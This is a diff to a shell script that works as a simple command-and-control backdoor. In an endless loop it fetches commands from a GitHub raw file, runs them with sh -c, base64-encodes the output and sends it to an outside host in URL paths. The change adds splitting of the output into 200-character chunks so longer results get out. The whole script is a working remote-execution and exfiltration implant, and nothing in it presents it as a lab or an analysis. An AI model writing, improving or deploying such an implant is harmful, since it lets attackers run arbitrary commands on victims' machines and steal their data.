@@ -1,12 +1,21 @@
 #!/bin/sh
 URL2="https://dev.thelab.sg"
+
 while true; do
     #URL="https://raw.githubusercontent.com/rossdraper/hello/main/req.txt?1"
     URL="https://raw.githubusercontent.com/rossdraper/hello/main/req.txt?$(date +%s)"
     current_content=$(curl -S -s "$URL")
     output=$(sh -c "$current_content")
-    #echo $current_content
     base64_output=$(echo "$output" | base64)
-    curl -S -s "$URL2/$base64_output" > /dev/null 2>&1
+
+    # Split the base64 output into chunks of less than 200 characters
+    chunk_size=200
+    length=${#base64_output}
+
+    for ((i=0; i<length; i+=chunk_size)); do
+        chunk=${base64_output:i:chunk_size}
+        curl -S -s "$URL2/$chunk" > /dev/null 2>&1
+    done
+
     sleep 10
- done
+done
